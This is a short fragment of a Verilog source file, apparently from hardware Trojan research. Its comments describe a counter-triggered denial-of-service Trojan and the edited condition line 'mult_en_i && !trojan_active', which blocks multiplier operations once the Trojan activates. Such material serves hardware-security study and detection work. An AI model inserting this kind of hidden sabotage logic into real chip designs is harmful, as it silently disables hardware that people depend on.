 ...
 * 
 * Description:
 *   Disables operations by blocking mult_en_i control signal
 *   
 * Trigger: Counter on mult_en_i
 * Payload: Block mult_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block mult_en_i when trojan is active
//
// IMPORTANT: mult_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (mult_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: mult_en_i && 0 = 0 (always false)
//   All operations controlled by mult_en_i are blocked
